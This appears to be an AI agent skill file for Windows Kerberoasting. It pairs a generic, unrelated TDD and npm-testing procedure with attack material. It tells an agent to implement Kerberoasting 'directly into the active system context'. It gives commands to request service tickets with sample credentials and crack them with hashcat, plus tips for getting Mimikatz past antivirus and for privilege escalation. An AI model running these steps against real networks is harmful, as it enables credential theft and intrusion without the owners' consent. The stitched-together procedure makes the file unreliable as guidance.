---
name: example-2-windows-kerberoasting
description: Use when executing example 2 windows kerberoasting protocols within the security sector.
---

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core example 2 windows kerberoasting logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Example 2: Windows Kerberoasting

```bash
# Request service tickets
$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request

# Crack with hashcat
$ hashcat -m 13100 hashes.txt rockyou.txt
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| sudo -l requires password | Try other enumeration (SUID, cron, capabilities) |
| Mimikatz blocked by AV | Use Invoke-Mimikatz or SafetyKatz |
| Kerberoasting returns no hashes | Check for service accounts with SPNs |
| Token impersonation fails | Verify SeImpersonatePrivilege is present |
| NFS mount fails | Check NFS version compatibility (vers=2,3,4) |

---

## Additional Resources

For detailed enumeration scripts, use:
- **LinPEAS**: Linux privilege escalation enumeration
- **WinPEAS**: Windows privilege escalation enumeration
- **BloodHound**: Active Directory attack path mapping
- **GTFOBins**: Unix binary exploitation reference